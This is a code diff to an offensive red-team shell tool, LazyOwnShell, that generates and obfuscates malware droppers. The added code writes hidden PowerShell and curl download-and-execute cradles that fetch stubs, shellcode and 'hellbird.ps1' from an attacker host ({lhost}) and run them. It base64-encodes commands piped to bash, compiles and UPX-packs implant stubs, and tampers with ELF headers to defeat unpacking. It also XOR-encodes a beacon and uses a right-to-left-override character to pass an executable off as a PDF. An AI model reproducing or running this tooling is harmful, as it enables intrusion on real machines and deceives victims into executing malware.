@@ -6351,6 +6351,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN Show running services", "net start"),
             ("WIN User accounts", "net user"),
             ("WIN Show computers", "net view"),
+            ("WIN Hellbird", f"powershell -ep bypass -c \"IWR http://{lhost}/hellbird.ps1 -OutFile hellbird.ps1; .\hellbird.ps1 -Target windows -Url 'http://{lhost}/shellcode_windows.txt' -Key '0x33'\""),
             ("WIN domain trust", "nltest /domain_trusts"),
             ("WIN check relationship", "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()"),
             ("WIN Trust all AD", "Get-ADTrust -Filter *"),
@@ -8886,7 +8887,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         utf16_payload = line.encode('utf-16le')
         base64_payload = base64.b64encode(utf16_payload).decode('utf-8')
-        final_command = f"powershell /enc {base64_payload}"
+        final_command = f"cmd.exe /c powershell.exe %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e {base64_payload}"
         final_final_command = f"cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_payload}"
         payloads = f"""
         cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_payload}
@@ -10803,13 +10804,20 @@ class LazyOwnShell(cmd2.Cmd):
             choice = input("    [!] choice target windows 1, linux 2, windows bat 3, mac 4, android 5, IOS 6, WebAssembly 7 (default 1) : ") or '1'
 
         if choice == '1':
-            payload = f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{line}.exe -OutFile {line}.exe ; .\\{line}.exe`\"\""
-            copy2clip(payload)
+            payload = f"powershell -c \"Invoke-WebRequest 'http://{lhost}/stub.exe' -OutFile 'stub.exe'; Start-Process 'stub.exe'\""
+            print_msg(payload)
+            self.onecmd(f"encodewinbase64 {payload}")
             platform = "windows"
             user_agent = user_agent_win
         elif choice == '2':
-            payload = f"curl http://{lhost}/{line} -o /tmp/{line} && sh /tmp/{line}"
-            copy2clip(payload)
+            payload = f"""curl http://{lhost}/stub -o /tmp/stub && \
+            [ -s /tmp/stub ] && \
+            chmod +x /tmp/stub && \
+            /tmp/stub""".replace("            ","")
+            utf8_encoded = payload.encode("utf-8")
+            base64_encoded = base64.b64encode(utf8_encoded).decode('utf-8')
+            cmd = f"echo '{base64_encoded}' | base64 -d | bash"
+            copy2clip(cmd)
             platform = "linux"
             user_agent = user_agent_lin
         elif choice == '3':
@@ -10935,8 +10943,6 @@ class LazyOwnShell(cmd2.Cmd):
         contentr = contentr.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
         with open("sessions/r.sh", 'w+') as f:
             f.write(contentr)
-        #with open(gofile_ws, 'r') as f:
-        #    content_ws = f.read()
 
         with open(gofile, 'r') as f:
             content = f.read()
@@ -11020,6 +11026,16 @@ class LazyOwnShell(cmd2.Cmd):
             cmd_ant_elf = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})\\x7fELF/$1$2\\0\\0\\0\\0/s\' "monrev"'
             self.cmd(cmd_anti_upx)
             self.cmd(cmd_ant_elf)
+            with open("sessions/implant/stub_lin.c", 'r') as f:
+                stub = f.read()
+                f.close()
+            
+            stub = stub.replace("{lhost}", lhost)
+            with open("sessions/stub.c", 'w+') as f:
+                f.write(stub)
+                f.close()
+            command_stub = f"gcc -o sessions/stub sessions/stub.c  -lcurl && upx sessions/stub"
+            self.cmd(command_stub)
 
         elif platform == "windows":
             binary = f"{line}.exe"
@@ -11044,6 +11060,18 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go2} -OutFile {implant_go2} ; .\\{implant_go2}`\"\"")
             print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/b{line}.exe -OutFile b{line}.exe ; .\\b{line}.exe`\"\"")
 
+            with open("sessions/implant/stub.c", 'r') as f:
+                stub = f.read()
+                f.close()
+            
+            stub = stub.replace("{lhost}", lhost)
+            with open("sessions/stub.c", 'w+') as f:
+                f.write(stub)
+                f.close()
+            command_stub = f"x86_64-w64-mingw32-gcc -o sessions/stub.exe sessions/stub.c -lwininet -ladvapi32 -s -Os -static -fno-stack-protector -lcrypt32 && upx sessions/stub.exe"
+            self.cmd(command_stub)
+
+            
             self.cmd(compile_cw)
             self.cmd(command_mrhyde)
             self.cmd(compile_command)
@@ -11056,7 +11084,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(upx)
             new_binary = f"{self.sessions_dir}/{binary}"
             newname = (new_binary.split('.')[0] + u'\u202e' + ".pdfx"[::-1]  + new_binary.split('.')[1]).encode('utf-8')
-
+            
             print_msg("New Camuflage File " + str(newname))
             shutil.copy(file, newname)
 
@@ -11120,6 +11148,19 @@ class LazyOwnShell(cmd2.Cmd):
             upx = f"upx {self.sessions_dir}/{binary}"
             self.cmd(upx)
 
+        encbeacon = f"""
+        python3 -c "
+        import base64
+        with open('sessions/{binary}', 'rb') as f:
+            data = f.read()
+            xor_data = bytes([b ^ 0x33 for b in data])
+            b64_data = base64.b64encode(xor_data)
+        with open('sessions/beacon.enc', 'wb') as f:
+            f.write(b64_data)
+        "
+        """.replace("        ","")
+        self.display_toastr(f"Executing... {encbeacon}", type="info")
+        os.system(encbeacon)
         print_msg(f"Go agent {implantgo} compiled successfully.")
 
 
